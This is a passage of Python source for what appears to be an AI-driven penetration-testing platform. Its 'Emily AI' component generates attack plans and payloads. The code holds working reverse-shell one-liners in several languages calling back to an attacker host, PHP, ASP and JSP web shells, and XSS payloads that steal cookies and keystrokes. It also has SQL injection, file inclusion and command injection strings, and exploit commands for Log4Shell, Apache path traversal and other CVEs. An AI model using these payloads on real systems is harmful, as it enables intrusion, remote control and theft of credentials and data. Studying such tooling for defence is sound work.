    def analyze(self, scan_result, history=None, similar_cases=None):
        """Complete analysis pipeline"""
        if history is None: history = []
        context = self.context_builder.build(scan_result, similar_cases, history)
        
        # Level 6: Rule Engine Baseline
        baseline = self.rule_engine.generate_baseline(context)
        
        # Level 3: Multi-Step Reasoning
        entry_analysis = self.llm_reasoner.identify_entry_points(context)
        impact_analysis = self.llm_reasoner.evaluate_impact(entry_analysis, context)
        strategies = self.llm_reasoner.recommend_strategy(context, baseline, entry_analysis, impact_analysis)
        success_prediction = self.llm_reasoner.predict_success(strategies, history)
        
        # Level 4: Self-Critique
        critique = self.llm_reasoner.critique_strategy(strategies)
        refined_strategies = self.llm_reasoner.refine_strategy(strategies, critique)
        
        # Level 7: Risk Prediction
        primary_vuln = scan_result.get("vulnerabilities", [{}])[0] if scan_result.get("vulnerabilities") else {}
        primary_severity = primary_vuln.get("severity", "medium") if isinstance(primary_vuln, dict) else "medium"
        risk_score = self.risk_predictor.predict(
            severity=primary_severity,
            tool=refined_strategies[0].get("tools", [""])[0] if refined_strategies else None
        )
        
        # Level 8: Uncertainty and Confidence Calibration
        uncertainty = self.confidence_calibrator.calculate_uncertainty(
            context, 
            len(similar_cases) if similar_cases else 0
        )
        
        confidence = self.confidence_calibrator.calibrate(
            similarity_score=0.7 if similar_cases else 0.3,
            historical_rate=self.risk_predictor.global_success_rate,
            model_conf=success_prediction.get("success_probability", 0.5),
            uncertainty_factor=uncertainty
        )
        
        # Level 5: Attack Graph
        attack_graph = self.graph_builder.build_graph(
            refined_strategies,
            scan_result.get("vulnerabilities", []),
            scan_result.get("services", [])
        )
        
        # Level 9: Strategic Mode Selection
        mode = self._select_strategic_mode(context)
        
        return {
            "context": context,
            "baseline_strategies": baseline,
            "entry_analysis": entry_analysis,
            "impact_analysis": impact_analysis,
            "strategies": refined_strategies,
            "critique": critique,
            "success_prediction": success_prediction,
            "risk_score": risk_score,
            "confidence": confidence,
            "uncertainty": uncertainty,
            "attack_graph": attack_graph,
            "mode": mode,
            "analysis_id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat()
        }
    
    def _select_strategic_mode(self, context):
        """Level 9: Strategic Thinking Mode Selection"""
        # Determine appropriate mode based on context
        if len(context.get("vulnerabilities", [])) == 0:
            return {
                "mode": "recon",
                "description": "Reconnaissance Mode - Focus on information gathering",
                "priority": "discover assets and services"
            }
        elif any(v.get("severity") == "critical" for v in context.get("vulnerabilities", []) if isinstance(v, dict)):
            return {
                "mode": "exploitation",
                "description": "Exploitation Mode - Focus on critical vulnerabilities",
                "priority": "exploit critical vulnerabilities first"
            }
        elif len(context.get("open_ports", [])) > 10:
            return {
                "mode": "risk_prioritization",
                "description": "Risk Prioritization Mode - Large attack surface",
                "priority": "prioritize by risk score"
            }
        else:
            return {
                "mode": "standard",
                "description": "Standard Mode - Balanced approach",
                "priority": "follow standard methodology"
            }
    
    def process_feedback(self, user_id, scan_id, attack_id, feedback_data):
        """Process user feedback for learning"""
        self.learning_manager.store_feedback(None, user_id, scan_id, attack_id, feedback_data)
        
        # Update risk predictor
        feedback_records = self.learning_manager.learning_data["user_feedback"]
        self.risk_predictor.update_from_feedback(feedback_records)
        
        return {"status": "feedback_processed", "updated_stats": self.learning_manager.get_learning_stats()}

# ==================== GPU-OPTIMIZED RAG SYSTEM ====================
class GPURAGSystem:
    """RAG System with GPU-optimized embeddings"""
    def __init__(self):
        self.vulnerabilities = []
        self.initialized = False
        self.embeddings_cache = {}  # Cache for frequently searched terms
        self.model = None
        self.faiss_index = None
        self.vuln_texts = []
    
    def initialize(self, db: Session):
        """Initialize the RAG system with vulnerability data"""
        vulns = db.query(VulnerabilityDB).all()
        self.vulnerabilities = vulns
        self.initialized = True
        
        # Try to load the AI model from singleton
        try:
            self.model = AISingleton.get_model()
            
            # Build FAISS index if we have vulnerabilities
            if vulns and self.model is not None:
                self._build_index(vulns)
                
            print(f"✓ GPU-Optimized RAG System initialized with {len(vulns)} vulnerabilities")
        except:
            print(f"✓ Basic RAG System initialized with {len(vulns)} vulnerabilities (AI model unavailable)")
    
    def _build_index(self, vulns):
        """Build FAISS index for fast similarity search"""
        try:
            texts = []
            for vuln in vulns:
                text = f"{vuln.name} {vuln.description} {vuln.cve_id or ''}"
                texts.append(text)
            
            if texts:
                self.vuln_texts = texts
                # Encode all vulnerabilities
                embeddings = self.model.encode(texts)
                
                # Build FAISS index
                dimension = embeddings.shape[1]
                self.faiss_index = faiss.IndexFlatL2(dimension)
                self.faiss_index.add(embeddings.astype('float32'))
                
                print(f"  • FAISS index built with {len(vulns)} vectors")
        except Exception as e:
            print(f"  ⚠ FAISS index build failed: {e}")
    
    def search(self, query: str, k: int = 5, use_ai: bool = True) -> List[Dict]:
        """Search vulnerabilities - uses GPU AI if available, falls back to keyword search"""
        
        # Check cache first
        cache_key = f"{query}_{k}"
        if cache_key in self.embeddings_cache:
            return self.embeddings_cache[cache_key]
        
        # If AI model is available and requested, use semantic search
        if use_ai and self.model is not None and EMBEDDINGS_AVAILABLE:
            results = self._semantic_search(query, k)
        else:
            # Fallback to keyword search
            results = self._keyword_search(query, k)
        
        # Cache results (with a reasonable size limit)
        if len(self.embeddings_cache) < 100:
            self.embeddings_cache[cache_key] = results
        
        return results
    
    def _semantic_search(self, query: str, k: int) -> List[Dict]:
        """GPU-accelerated semantic search using embeddings"""
        try:
            if self.faiss_index is not None:
                # Use FAISS for fast search
                query_embedding = self.model.encode([query]).astype('float32')
                distances, indices = self.faiss_index.search(query_embedding, k)
                
                results = []
                for i, idx in enumerate(indices[0]):
                    if idx < len(self.vulnerabilities):
                        vuln = self.vulnerabilities[idx]
                        similarity = 1.0 / (1.0 + distances[0][i])  # Convert distance to similarity
                        
                        results.append({
                            "vulnerability": {
                                "id": vuln.id,
                                "cve_id": vuln.cve_id,
                                "name": vuln.name,
                                "description": vuln.description,
                                "severity": vuln.severity,
                                "remediation": vuln.remediation
                            },
                            "similarity_score": float(similarity),
                            "search_type": "semantic"
                        })
                
                return results
            else:
                # Fallback to simple similarity scoring
                query_embedding = self.model.encode(query)
                
                scored_results = []
                for vuln in self.vulnerabilities:
                    vuln_text = f"{vuln.name} {vuln.description} {vuln.cve_id or ''}"
                    vuln_embedding = self.model.encode(vuln_text[:512])
                    
                    # Calculate cosine similarity
                    similarity = np.dot(query_embedding, vuln_embedding) / (
                        np.linalg.norm(query_embedding) * np.linalg.norm(vuln_embedding)
                    )
                    
                    scored_results.append((similarity, vuln))
                
                scored_results.sort(key=lambda x: x[0], reverse=True)
                
                results = []
                for score, vuln in scored_results[:k]:
                    results.append({
                        "vulnerability": {
                            "id": vuln.id,
                            "cve_id": vuln.cve_id,
                            "name": vuln.name,
                            "description": vuln.description,
                            "severity": vuln.severity,
                            "remediation": vuln.remediation
                        },
                        "similarity_score": float(score),
                        "search_type": "semantic"
                    })
                
                return results
                
        except Exception as e:
            print(f"⚠ Semantic search error: {e}, falling back to keyword search")
            return self._keyword_search(query, k)
    
    def _keyword_search(self, query: str, k: int) -> List[Dict]:
        """Fallback keyword search"""
        results = []
        query_lower = query.lower()
        
        for vuln in self.vulnerabilities:
            score = 0
            if vuln.name and query_lower in vuln.name.lower():
                score += 3
            if vuln.description and query_lower in vuln.description.lower():
                score += 2
            if vuln.cve_id and query_lower in vuln.cve_id.lower():
                score += 3
            
            if score > 0:
                results.append({
                    "vulnerability": {
                        "id": vuln.id,
                        "cve_id": vuln.cve_id,
                        "name": vuln.name,
                        "description": vuln.description,
                        "severity": vuln.severity,
                        "remediation": vuln.remediation
                    },
                    "relevance_score": score,
                    "search_type": "keyword"
                })
        
        return sorted(results, key=lambda x: x['relevance_score'], reverse=True)[:k]
    
    def generate_attack_chain(self, vulnerabilities: List[Dict], target: str) -> List[Dict]:
        """Generate attack chain suggestions using AI if available"""
        chain = []
        
        for vuln in vulnerabilities[:3]:
            vuln_data = vuln.get('vulnerability', {}) if isinstance(vuln, dict) else {}
            vuln_name = vuln_data.get('name', '').lower()
            
            if 'sql' in vuln_name:
                chain.append({
                    "step": len(chain) + 1,
                    "tool": "sqlmap",
                    "command": f"sqlmap -u {target} --batch --level=3",
                    "description": "SQL Injection exploitation",
                    "ai_enhanced": False
                })
            elif 'xss' in vuln_name:
                chain.append({
                    "step": len(chain) + 1,
                    "tool": "beef",
                    "command": f"BeEF framework targeting {target}",
                    "description": "Cross-site scripting exploitation",
                    "ai_enhanced": False
                })
            elif 'ssh' in vuln_name:
                chain.append({
                    "step": len(chain) + 1,
                    "tool": "hydra",
                    "command": f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                    "description": "SSH brute force attack",
                    "ai_enhanced": False
                })
            elif 'apache' in vuln_name:
                chain.append({
                    "step": len(chain) + 1,
                    "tool": "metasploit",
                    "command": f"msfconsole -q -x 'use exploit/multi/http/apache_normalization; set RHOSTS {target}; run'",
                    "description": "Apache vulnerability exploitation",
                    "ai_enhanced": False
                })
        
        return chain

# ==================== BAYESIAN OPTIMIZER (SIMPLIFIED) ====================
class SimpleOptimizer:
    def optimize_attack(self, attack_type: str, previous_attempts: List[Dict]) -> Dict:
        """Simple optimization based on previous attempts"""
        if len(previous_attempts) < 3:
            return {"parameters": {}, "message": "Need more data"}
        
        # Simple heuristic
        successes = sum(1 for a in previous_attempts if a.get('success', False))
        success_rate = successes / len(previous_attempts) if previous_attempts else 0
        
        return {
            "parameters": {
                "threads": 10,
                "delay": 1,
                "timeout": 30
            },
            "expected_success_rate": success_rate,
            "message": "Optimization complete (simplified)"
        }

# ==================== CELERY TASKS (if available) ====================
if celery_app:
    @celery_app.task(bind=True, name="scan_task")
    def scan_task(self, user_id: int, target: str, scan_type: str):
        self.update_state(state='STARTED', meta={'progress': 10})
        
        # Simulate work
        import time
        time.sleep(2)
        
        self.update_state(state='STARTED', meta={'progress': 50})
        time.sleep(1)
        
        self.update_state(state='STARTED', meta={'progress': 90})
        
        return {
            'status': 'success',
            'target': target,
            'scan_type': scan_type,
            'results': {
                'open_ports': [22, 80, 443],
                'services': ['ssh', 'http', 'https']
            }
        }

# ==================== CONNECTION MANAGER ====================
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[int, List[WebSocket]] = {}
    
    async def connect(self, websocket: WebSocket, user_id: int):
        await websocket.accept()
        if user_id not in self.active_connections:
            self.active_connections[user_id] = []
        self.active_connections[user_id].append(websocket)
    
    def disconnect(self, websocket: WebSocket, user_id: int):
        if user_id in self.active_connections:
            self.active_connections[user_id].remove(websocket)
    
    async def send_personal_message(self, message: Dict, user_id: int):
        if user_id in self.active_connections:
            for connection in self.active_connections[user_id]:
                try:
                    await connection.send_json(message)
                except:
                    pass

manager = ConnectionManager()

# ==================== KALI VM ENDPOINTS ====================
class KaliVM:
    def __init__(self):
        self.vm_name = "Kali-Linux-VM"
        
    def check_vm_status(self) -> bool:
        try:
            result = subprocess.run(['VBoxManage', 'list', 'runningvms'], 
                                  capture_output=True, text=True, timeout=10)
            return self.vm_name in result.stdout
        except (subprocess.SubprocessError, FileNotFoundError):
            return False
    
    def start_vm(self) -> bool:
        try:
            subprocess.Popen(['VBoxManage', 'startvm', self.vm_name, '--type', 'headless'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except (subprocess.SubprocessError, FileNotFoundError):
            return False
    
    def stop_vm(self) -> bool:
        try:
            subprocess.Popen(['VBoxManage', 'controlvm', self.vm_name, 'acpipowerbutton'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except (subprocess.SubprocessError, FileNotFoundError):
            return False

kali_vm = KaliVM()

# ==================== CRYPTOGRAPHY TOOLS ====================
class CryptoTools:
    @staticmethod
    def caesar_cipher(text: str, shift: int, mode: str = 'encrypt') -> str:
        result = ""
        shift = shift if mode == 'encrypt' else -shift
        
        for char in text:
            if char.isalpha():
                ascii_offset = 65 if char.isupper() else 97
                result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
            else:
                result += char
        return result
    
    @staticmethod
    def rot13(text: str) -> str:
        return CryptoTools.caesar_cipher(text, 13, 'encrypt')
    
    @staticmethod
    def xor_cipher(text: str, key: str) -> str:
        result = ""
        key_length = len(key)
        for i, char in enumerate(text):
            result += chr(ord(char) ^ ord(key[i % key_length]))
        return result
    
    @staticmethod
    def binary_encode(text: str) -> str:
        return ' '.join(format(ord(char), '08b') for char in text)
    
    @staticmethod
    def binary_decode(binary: str) -> str:
        binary_values = binary.split()
        return ''.join(chr(int(b, 2)) for b in binary_values)
    
    @staticmethod
    def hex_encode(text: str) -> str:
        return text.encode('utf-8').hex()
    
    @staticmethod
    def hex_decode(hex_str: str) -> str:
        return bytes.fromhex(hex_str).decode('utf-8')

# ==================== EXPORT DATA GENERATOR ====================
class ExportDataGenerator:
    """Generate export data from database records for Burp Suite testing"""
    
    @staticmethod
    def generate_export_data(db: Session, user_id: int) -> dict:
        """Generate comprehensive export data from user's scans and attacks"""
        
        # Get user's scans
        scans = db.query(ScanHistory).filter(
            ScanHistory.user_id == user_id
        ).order_by(ScanHistory.timestamp.desc()).limit(20).all()
        
        # Get user's attacks
        attacks = db.query(AttackHistory).filter(
            AttackHistory.user_id == user_id
        ).order_by(AttackHistory.timestamp.desc()).limit(20).all()
        
        # Get AI analyses
        analyses = db.query(AIAnalysis).filter(
            AIAnalysis.user_id == user_id
        ).order_by(AIAnalysis.timestamp.desc()).limit(10).all()
        
        # Get vulnerabilities from database
        vulns = db.query(VulnerabilityDB).limit(50).all()
        
        export_data = {
            "burp": {
                "findings": [],
                "history": []
            },
            "vulnerabilities": {
                "scans": [],
                "database": []
            },
            "wireshark": {
                "packets": []
            },
            "attacks": {
                "attempts": []
            },
            "ai_analyses": [],
            "targets": [],
            "ports": [],
            "exploits": []
        }
        
        # Process scans for findings
        for scan in scans:
            if scan.vulnerabilities:
                try:
                    vuln_list = json.loads(scan.vulnerabilities)
                    for vuln in vuln_list[:5]:  # Limit to 5 per scan
                        if isinstance(vuln, dict):
                            export_data["burp"]["findings"].append({
                                "title": vuln.get('name', 'Unknown Vulnerability'),
                                "path": scan.target,
                                "severity": vuln.get('severity', 'MEDIUM'),
                                "description": vuln.get('description', 'No description'),
                                "port": vuln.get('port', 80),
                                "cve": vuln.get('cve', None)
                            })
                            
                            export_data["vulnerabilities"]["scans"].append({
                                "tool": scan.tool_used,
                                "target": scan.target,
                                "findings": [{
                                    "type": vuln.get('name'),
                                    "path": scan.target,
                                    "severity": vuln.get('severity')
                                }],
                                "timestamp": scan.timestamp.isoformat() if scan.timestamp else None
                            })
                except:
                    pass
        
        # Process attacks
        for attack in attacks:
            attack_data = {
                "target": attack.target,
                "tool": attack.tool_used,
                "type": attack.attack_type,
                "command": attack.command,
                "success": attack.success,
                "timestamp": attack.timestamp.isoformat() if attack.timestamp else None
            }
            export_data["attacks"]["attempts"].append(attack_data)
            
            # Add to burp history
            export_data["burp"]["history"].append({
                "method": "GET" if "get" in attack.attack_type.lower() else "POST",
                "host": attack.target,
                "path": "/",
                "status": 200 if attack.success else 403,
                "tool": attack.tool_used
            })
        
        # Process vulnerability database
        for vuln in vulns[:20]:
            export_data["vulnerabilities"]["database"].append({
                "cve_id": vuln.cve_id,
                "name": vuln.name,
                "description": vuln.description,
                "severity": vuln.severity,
                "cvss_score": vuln.cvss_score,
                "remediation": vuln.remediation,
                "attack_tools": vuln.attack_tools
            })
            
            # Add exploits
            if vuln.attack_tools:
                tools = vuln.attack_tools.split(',')
                for tool in tools:
                    export_data["exploits"].append({
                        "name": vuln.name,
                        "tool": tool.strip(),
                        "cve": vuln.cve_id,
                        "probability": vuln.cvss_score / 10 if vuln.cvss_score else 0.7
                    })
        
        # Process AI analyses
        for analysis in analyses:
            try:
                strategies = json.loads(analysis.strategies) if analysis.strategies else []
                export_data["ai_analyses"].append({
                    "analysis_id": analysis.analysis_id,
                    "risk_score": analysis.risk_score,
                    "confidence": analysis.confidence,
                    "mode": analysis.mode,
                    "timestamp": analysis.timestamp.isoformat() if analysis.timestamp else None,
                    "strategy_count": len(strategies)
                })
            except:
                pass
        
        # Add sample Wireshark data if none exists
        if not export_data["wireshark"]["packets"]:
            export_data["wireshark"]["packets"] = [
                {
                    "source": "192.168.1.105",
                    "destination": "8.8.8.8",
                    "protocol": "DNS",
                    "info": "Standard query A jiomart.com"
                },
                {
                    "source": "192.168.1.105",
                    "destination": "52.84.12.34",
                    "protocol": "TCP",
                    "info": "HTTP GET /products.php"
                },
                {
                    "source": "52.84.12.34",
                    "destination": "192.168.1.105",
                    "protocol": "TCP",
                    "info": "HTTP 200 OK"
                }
            ]
        
        # Add sample ports if none exists
        if not export_data["ports"]:
            export_data["ports"] = [
                {"port": 22, "service": "ssh", "state": "open", "risk": "Medium"},
                {"port": 80, "service": "http", "state": "open", "risk": "High"},
                {"port": 443, "service": "https", "state": "open", "risk": "High"},
                {"port": 8080, "service": "http-alt", "state": "open", "risk": "Medium"}
            ]
        
        return export_data
# ==================== EMILY AI - ADVANCED EXPLOIT ANALYZER & PAYLOAD GENERATOR ====================

class EmilyAI:
    """
    Emily AI - Advanced Exploit Analyzer & Payload Generator
    Analyzes vulnerabilities, generates attack plans, creates payloads, and produces comprehensive reports
    """
    
    def __init__(self, intelligence_engine=None, rag_system=None):
        self.name = "Emily"
        self.version = "2.0"
        self.intelligence_engine = intelligence_engine
        self.rag_system = rag_system
        self.attack_patterns = self._load_attack_patterns()
        self.payload_templates = self._load_payload_templates()
        self.exploit_database = self._load_exploit_database()
        self.learning_history = []
        print(f"✓ Emily AI v{self.version} initialized - Exploit Analyst & Payload Generator")
    
    def _load_attack_patterns(self):
        """Load common attack patterns and techniques"""
        return {
            "web": {
                "sql_injection": {
                    "techniques": ["error_based", "union_based", "blind", "time_based", "boolean_based"],
                    "tools": ["sqlmap", "jSQL", "havij"],
                    "payloads": ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--"],
                    "detection": ["SQL syntax error", "database error", "ODBC error"],
                    "mitigation": ["parameterized queries", "input validation", "WAF"]
                },
                "xss": {
                    "techniques": ["reflected", "stored", "dom_based"],
                    "tools": ["beef", "xsstrike", "xsser"],
                    "payloads": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert(document.cookie)"],
                    "detection": ["script injection", "alert popup", "cookie theft"],
                    "mitigation": ["output encoding", "CSP", "input sanitization"]
                },
                "lfi_rfi": {
                    "techniques": ["path_traversal", "wrapper_exploit", "null_byte"],
                    "tools": ["wfuzz", "dirb", "gobuster"],
                    "payloads": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "expect://id"],
                    "detection": ["file inclusion", "path disclosure", "wrapper usage"],
                    "mitigation": ["input validation", "whitelist", "disable wrappers"]
                },
                "csrf": {
                    "techniques": ["form_submission", "ajax_request", "image_tag"],
                    "tools": ["burp", "csrfpoet", "xsrfprobe"],
                    "payloads": ["<img src='http://target.com/change?email=hacker@mail.com'>", "<form>", "XMLHttpRequest"],
                    "detection": ["state-changing requests", "missing tokens", "CORS misconfig"],
                    "mitigation": ["anti-CSRF tokens", "SameSite cookies", "re-authentication"]
                },
                "rce": {
                    "techniques": ["command_injection", "code_execution", "deserialization"],
                    "tools": ["metasploit", "commix", "exploitdb"],
                    "payloads": ["; id", "| whoami", "$(cat /etc/passwd)", "system('id')"],
                    "detection": ["command output", "error messages", "unexpected behavior"],
                    "mitigation": ["input sanitization", "disable exec functions", "least privilege"]
                }
            },
            "network": {
                "port_scanning": {
                    "techniques": ["syn_scan", "connect_scan", "udp_scan", "fin_scan"],
                    "tools": ["nmap", "masscan", "unicornscan"],
                    "payloads": ["SYN packets", "ACK packets", "UDP probes"],
                    "detection": ["open ports", "service banners", "OS fingerprinting"],
                    "mitigation": ["firewall rules", "port knocking", "IDS/IPS"]
                },
                "service_exploitation": {
                    "techniques": ["buffer_overflow", "format_string", "heap_overflow"],
                    "tools": ["metasploit", "core_impact", "canvas"],
                    "payloads": ["shellcode", "ROP chains", "egg hunters"],
                    "detection": ["service crash", "memory corruption", "unusual behavior"],
                    "mitigation": ["ASLR", "DEP", "stack canaries"]
                },
                "mitm": {
                    "techniques": ["arp_spoofing", "dns_spoofing", "ssl_stripping"],
                    "tools": ["ettercap", "bettercap", "responder"],
                    "payloads": ["ARP replies", "DNS responses", "fake certificates"],
                    "detection": ["ARP anomalies", "DNS inconsistencies", "certificate warnings"],
                    "mitigation": ["ARP spoofing detection", "DNSSEC", "certificate pinning"]
                }
            },
            "wireless": {
                "wifi_cracking": {
                    "techniques": ["wpa_handshake", "wep_cracking", "pmkid"],
                    "tools": ["aircrack-ng", "hashcat", "john"],
                    "payloads": ["deauth packets", "handshake capture", "PMKID capture"],
                    "detection": ["weak encryption", "default passwords", "WPS enabled"],
                    "mitigation": ["WPA3", "strong passwords", "disable WPS"]
                },
                "bluetooth": {
                    "techniques": ["bluesnarfing", "bluejacking", "bluebugging"],
                    "tools": ["bluesnarfer", "btcrack", "hcitool"],
                    "payloads": ["OBEX push", "RFCOMM connection", "SDP queries"],
                    "detection": ["open Bluetooth", "discoverable mode", "legacy devices"],
                    "mitigation": ["disable when not in use", "pairing authentication", "latest firmware"]
                }
            },
            "password": {
                "bruteforce": {
                    "techniques": ["dictionary", "hybrid", "mask_attack"],
                    "tools": ["hydra", "ncrack", "medusa"],
                    "payloads": ["common passwords", "wordlists", "rules-based mutations"],
                    "detection": ["weak passwords", "default credentials", "no lockout"],
                    "mitigation": ["strong password policy", "account lockout", "MFA"]
                },
                "hash_cracking": {
                    "techniques": ["dictionary", "rainbow_tables", "rules_based"],
                    "tools": ["hashcat", "john", "ophcrack"],
                    "payloads": ["MD5", "NTLM", "bcrypt", "sha256"],
                    "detection": ["weak hashing", "unsalted hashes", "fast algorithms"],
                    "mitigation": ["slow hashing (bcrypt)", "salting", "key stretching"]
                }
            }
        }
    
    def _load_payload_templates(self):
        """Load payload templates for various exploits"""
        return {
            "reverse_shell": {
                "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "php": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
                "netcat": "nc -e /bin/sh {lhost} {lport}",
                "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
                "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                "ruby": "ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
            },
            "web_shell": {
                "php_simple": "<?php system($_GET['cmd']); ?>",
                "php_advanced": "<?php if(isset($_REQUEST['cmd'])){{ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }}?>",
                "asp": "<% eval request(\"cmd\") %>",
                "jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "python_cgi": "#!/usr/bin/env python\nimport cgi, subprocess\nform = cgi.FieldStorage()\ncmd = form.getvalue('cmd', 'id')\nprint(\"Content-Type: text/html\")\nprint()\nprint(subprocess.getoutput(cmd))"
            },
            "sql_injection": {
                "error_based": "' OR '1'='1",
                "union_based": "' UNION SELECT NULL, username, password FROM users--",
                "blind": "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a",
                "time_based": "' OR IF(1=1, SLEEP(5), 0)--",
                "boolean_based": "' AND 1=1--",
                "stacked_queries": "'; DROP TABLE users--"
            },
            "xss_payloads": {
                "basic": "<script>alert('XSS')</script>",
                "image": "<img src=x onerror=alert('XSS')>",
                "svg": "<svg onload=alert('XSS')>",
                "iframe": "<iframe src=\"javascript:alert('XSS')\">",
                "cookie_stealer": "<script>fetch('http://{lhost}/steal?cookie='+document.cookie)</script>",
                "keylogger": "<script>document.onkeypress=function(e){{fetch('http://{lhost}/log?key='+e.key)}}</script>"
            },
            "lfi_payloads": {
                "basic": "../../../../etc/passwd",
                "windows": "..\\..\\..\\windows\\win.ini",
                "php_wrapper": "php://filter/convert.base64-encode/resource=index.php",
                "expect_wrapper": "expect://id",
                "log_poisoning": "../../../../var/log/apache2/access.log"
            },
            "command_injection": {
                "basic": "; id",
                "pipe": "| whoami",
                "and": "&& cat /etc/passwd",
                "or": "|| echo vulnerable",
                "backticks": "`id`",
                "subshell": "$(cat /etc/passwd)"
            }
        }
    
    def _load_exploit_database(self):
        """Load exploit database with CVE mappings"""
        return {
            "CVE-2021-41773": {
                "name": "Apache Path Traversal",
                "description": "Path traversal vulnerability in Apache HTTP Server 2.4.49",
                "cvss": 9.8,
                "service": "http",
                "port": [80, 443],
                "exploit": "curl -s --path-as-is \"http://{target}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"",
                "payload": ".%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "tools": ["curl", "metasploit", "nuclei"],
                "remediation": "Update to Apache 2.4.51"
            },
            "CVE-2021-44228": {
                "name": "Log4Shell",
                "description": "RCE in Log4j 2.x",
                "cvss": 10.0,
                "service": ["http", "ldap"],
                "port": [80, 443, 389],
                "exploit": "${jndi:ldap://{lhost}:1389/a}",
                "payload": "${jndi:ldap://{lhost}:1389/Exploit}",
                "tools": ["metasploit", "nmap", "jndi-exploit"],
                "remediation": "Update to Log4j 2.17.1"
            },
            "CVE-2017-0144": {
                "name": "EternalBlue",
                "description": "SMB vulnerability in Windows",
                "cvss": 9.3,
                "service": "smb",
                "port": [445, 139],
                "exploit": "use exploit/windows/smb/ms17_010_eternalblue",
                "payload": "windows/x64/meterpreter/reverse_tcp",
                "tools": ["metasploit", "eternalblue_exploit", "smbexec"],
                "remediation": "Apply MS17-010 patch"
            },
            "CVE-2019-0708": {
                "name": "BlueKeep",
                "description": "RDP vulnerability in Windows",
                "cvss": 9.8,
                "service": "rdp",
                "port": [3389],
                "exploit": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
                "payload": "windows/x64/meterpreter/reverse_tcp",
                "tools": ["metasploit", "bluekeep_scanner", "rdp_check"],
                "remediation": "Apply security patch"
            },
            "CVE-2020-1472": {
                "name": "Zerologon",
                "description": "Netlogon privilege escalation",
                "cvss": 9.8,
                "service": "netlogon",
                "port": [445],
                "exploit": "python3 zerologon.py {target}",
                "payload": "NULL session attack",
                "tools": ["impacket", "zerologon_exploit", "secretsdump"],
                "remediation": "Apply security update"
            },
            "CVE-2021-26855": {
                "name": "ProxyLogon",
                "description": "Exchange Server RCE",
                "cvss": 9.8,
                "service": "https",
                "port": [443],
                "exploit": "curl -k https://{target}/ecp/{payload}",
                "payload": "..\\..\\..\\windows\\win.ini",
                "tools": ["metasploit", "proxylogon", "exchange_exploit"],
                "remediation": "Apply security patches"
            }
        }
    
    def analyze_target(self, target_info, vulnerabilities):
        """
        Comprehensive target analysis by Emily AI
        Returns attack plan, payloads, and recommendations
        """
        analysis = {
            "target": target_info.get("target", "unknown"),
            "timestamp": datetime.utcnow().isoformat(),
            "summary": {},
            "attack_vectors": [],
            "exploit_chain": [],
            "payloads": [],
            "recommendations": [],
            "risk_level": "LOW",
            "confidence": 0.0
        }
        
        # Analyze each vulnerability
        for vuln in vulnerabilities:
            vuln_name = vuln.get("name", "").lower()
            severity = vuln.get("severity", "MEDIUM")
            service = vuln.get("service", "unknown")
            port = vuln.get("port", 0)
            
            # Match with exploit database
            exploit = self._match_exploit(vuln)
            
            # Generate attack vector
            attack_vector = self._generate_attack_vector(vuln, exploit, target_info)
            if attack_vector:
                analysis["attack_vectors"].append(attack_vector)
            
            # Generate payload
            payload = self._generate_payload(vuln, exploit, target_info)
            if payload:
                analysis["payloads"].append(payload)
            
            # Add to exploit chain
            analysis["exploit_chain"].append({
                "vulnerability": vuln_name,
                "service": service,
                "port": port,
                "severity": severity,
                "exploit": exploit.get("name") if exploit else "Unknown",
                "probability": vuln.get("probability", 75)
            })
        
        # Sort exploit chain by probability
        analysis["exploit_chain"] = sorted(
            analysis["exploit_chain"], 
            key=lambda x: x["probability"], 
            reverse=True
        )
        
        # Generate recommendations
        analysis["recommendations"] = self._generate_recommendations(analysis["attack_vectors"])
        
        # Calculate risk level
        risk_score = self._calculate_risk_score(analysis["attack_vectors"])
        analysis["risk_level"] = self._get_risk_level(risk_score)
        analysis["confidence"] = min(0.95, risk_score / 100)
        
        # Generate summary
        analysis["summary"] = {
            "total_vulnerabilities": len(vulnerabilities),
            "critical_count": sum(1 for v in vulnerabilities if v.get("severity") == "CRITICAL"),
            "high_count": sum(1 for v in vulnerabilities if v.get("severity") == "HIGH"),
            "medium_count": sum(1 for v in vulnerabilities if v.get("severity") == "MEDIUM"),
